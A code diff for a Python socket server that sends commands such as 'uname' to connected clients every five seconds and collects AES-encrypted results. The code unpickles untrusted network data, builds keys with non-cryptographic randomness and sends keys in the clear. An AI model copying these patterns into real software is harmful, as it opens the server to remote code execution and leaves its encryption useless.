@@ -3,6 +3,7 @@ import time
 import pickle
 import threading
 import random
+import pdb
 from Crypto.Cipher import AES
 import mysql.connector as mysql
 
@@ -22,21 +23,21 @@ s.bind(serverAddress)
 s.listen(1)
 
 socketDict = {} # who : conn
-commandList = ['uptime', 'uname', 'pwd']
+commandList = ['uname']
 global resultDict
 resultDict = {} #Holds who : [results] 
 global key
 key = []
 
 
-def encryptAES(message, key):
-    obj = AES.new(key[0], AES.MODE_CBC, key[1])
+def encryptAES(message, key, key2):
+    obj = AES.new(key, AES.MODE_CFB, key2)
     ciphertext = obj.encrypt(message)
     return ciphertext
 
 
-def decryptAES(ciphertext, key):
-    obj2 = AES.new(key[0], AES.MODE_CBC, key[1])
+def decryptAES(ciphertext, key, key2):
+    obj2 = AES.new(key, AES.MODE_CFB, key2)
     message = obj2.decrypt(ciphertext)
     return message
 
@@ -46,7 +47,7 @@ def generateKeys(keySize):
     for i in range(0, 2):
         x = ""
         for j in range(keySize):
-            x += str(int(random.random() * 10))
+            x += chr(int(random.randrange(65, 90)))
         key.append(x)
     return key
 
@@ -55,10 +56,10 @@ def generateKeys(keySize):
 def connHandler(socket, x):
     while True:
         try:
-            conn, addr = socket.accept()
-            key = generateKeys(8) #Generate keypair
-            socketDict.update({pickle.loads(conn.recv(2048)) : [conn, key]})
-            conn.send(pickle.dumps(key)) 
+            conn, addr = socket.accept() #accept connection
+            key = generateKeys(16) #Generate keypair
+            socketDict.update({pickle.loads(conn.recv(2048)) : [conn, key]}) #store key
+            conn.send(pickle.dumps(key)) #send key
         except Exception as e:
             print(e)
 
@@ -67,7 +68,7 @@ def sendCommands():
     for key in socketDict.keys():
         for command in commandList:
             try:
-                socketDict[key][0].send(pickle.dumps(str(command)))
+                socketDict[key][0].send(pickle.dumps(encryptAES(command, socketDict[key][1][0], socketDict[key][1][1])))
                 receive(key)
             except Exception as e:
                 print(e)
@@ -80,8 +81,9 @@ def sendCommands():
 def receive(key):
     resultDict.update({key : []})
     try:
-        x = pickle.loads(socketDict[key][0].recv(2048))
-        resultDict[key].append(x)
+        x = pickle.loads(socketDict[key][0].recv(2048)) #Deserialize
+        x = decryptAES(x, socketDict[key][1][0], socketDict[key][1][1]) #Decrypt
+        resultDict[key].append(x) #store the result for said connection in resultDict
     except Exception as e:
         print(e)
         time.sleep(1)
@@ -106,6 +108,7 @@ def connDatabase(resultDict):
         pass
 
 def main():
+
     threadedHandler = threading.Thread(target=connHandler, args=(s, 1)) 
     threadedHandler.start()
 
@@ -113,7 +116,6 @@ def main():
     while True:
         timeDiff = time.time() - startingTime
         if timeDiff > 5: #Send command every 5 seconds
-            print(key)
             sendCommands()
             startingTime = time.time()
         time.sleep(1)
